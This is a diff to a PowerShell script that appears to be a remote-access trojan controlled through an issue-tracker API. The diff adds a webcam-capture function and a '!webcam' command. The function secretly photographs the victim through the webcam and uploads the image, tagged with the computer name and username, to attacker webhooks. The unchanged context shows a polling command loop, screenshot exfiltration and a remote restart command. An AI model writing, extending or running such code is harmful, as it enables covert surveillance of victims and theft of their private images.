@@ -127,6 +127,71 @@ Live screenshot from $computerName - $username
     Remove-Item $tempfile -ErrorAction SilentlyContinue
 }
 
+function Send-Webcam {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+
+        # Create webcam capture object (video device)
+        $capture = New-Object System.Windows.Forms.PictureBox
+
+        # Use Windows built-in COM object for camera: WIA
+        $wia = New-Object -ComObject WIA.DeviceManager
+
+        # Find video input device (webcam)
+        $camera = $wia.DeviceInfos | Where-Object { $_.Type -eq 2 } | Select-Object -First 1
+
+        if (-not $camera) {
+            $errorBody = @{ content = "❌ Webcam not detected on $computerName" } | ConvertTo-Json
+            Invoke-RestMethod -Uri $main_webhook -Method Post -Body $errorBody -ContentType "application/json"
+            return
+        }
+
+        # Connect to webcam
+        $device = $camera.Connect()
+
+        # Take picture
+        $img = $device.ExecuteCommand("{AF933CAC-ACAD-11D2-A093-00C04F72DC3C}")
+
+        # Save image
+        $tempfile = "$env:temp\webcam.png"
+        $img.SaveFile($tempfile)
+
+        # Prepare multipart upload
+        $boundary = [System.Guid]::NewGuid().ToString()
+        $fileBytes = [System.IO.File]::ReadAllBytes($tempfile)
+        $enc = [System.Text.Encoding]::GetEncoding('iso-8859-1')
+        $fileEnc = $enc.GetString($fileBytes)
+
+        $body = @"
+--$boundary
+Content-Disposition: form-data; name="file"; filename="webcam.png"
+Content-Type: image/png
+
+$fileEnc
+--$boundary
+Content-Disposition: form-data; name="content"
+
+📷 Webcam capture from $computerName - $username
+--$boundary--
+"@
+
+        # Send to correct webhook
+        if ($session_webhook -and $session_webhook -ne "pending") {
+            Invoke-RestMethod -Uri $session_webhook -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
+        } else {
+            Invoke-RestMethod -Uri $main_webhook -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
+        }
+
+        Remove-Item $tempfile -ErrorAction SilentlyContinue
+    }
+    catch {
+        $err = @{ content = "❌ Webcam error: $($_.Exception.Message)" } | ConvertTo-Json
+        Invoke-RestMethod -Uri $main_webhook -Method Post -Body $err -ContentType "application/json"
+    }
+}
+
+
 function Open-URL {
     param([string]$url)
     
@@ -416,6 +481,13 @@ while($true) {
                 Invoke-RestMethod -Uri $issue_api -Method Patch -Body $update_body -Headers $headers -TimeoutSec 30
                 $last_command = "none"
             }
+            elseif ($fixedCommand -eq "!webcam") {
+                Send-Webcam
+
+                $update_body = @{body = '{"command":"none","webhook":"' + $session_webhook + '"}'} | ConvertTo-Json
+                Invoke-RestMethod -Uri $issue_api -Method Patch -Body $update_body -Headers $headers -TimeoutSec 30
+                $last_command = "none"
+            }
             elseif($fixedCommand -eq "!restart") {
                 # REMOVED: Write-Host "Restarting computer..."
                 $success = Restart-Computer
@@ -493,5 +565,6 @@ while($true) {
         Start-Sleep 30
     }
 }
+
 
 
